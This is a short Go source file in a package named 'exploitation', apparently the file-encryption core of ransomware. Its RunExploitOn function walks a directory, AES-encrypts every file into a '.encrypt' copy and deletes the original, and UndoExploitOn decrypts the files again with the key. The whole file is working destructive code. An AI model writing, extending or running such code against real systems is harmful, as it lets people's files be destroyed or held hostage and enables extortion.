package exploitation

import (
	"log"
	"os"
	"path/filepath"
	"security_lib/aes_lib/operation"
	"strings"
)

func RunExploitOn(path, keyPath string) {
	filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Fatalln(err.Error())
		}

		if info.IsDir() {
			return nil
		}

		newPath := path + ".encrypt"
		operation.Encrypt(keyPath, path, newPath)
		log.Printf("[*] %s => %s\n", path, newPath)
		os.Remove(path)
		return nil
	})

}

func UndoExploitOn(path, keyPath string) {
	filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Fatalln(err.Error())
		}

		if info.IsDir() {
			return nil
		}

		newPath := strings.Split(path, ".encrypt")[0]
		operation.Decrypt(keyPath, path, newPath)
		os.Remove(path)
		return nil
	})

}
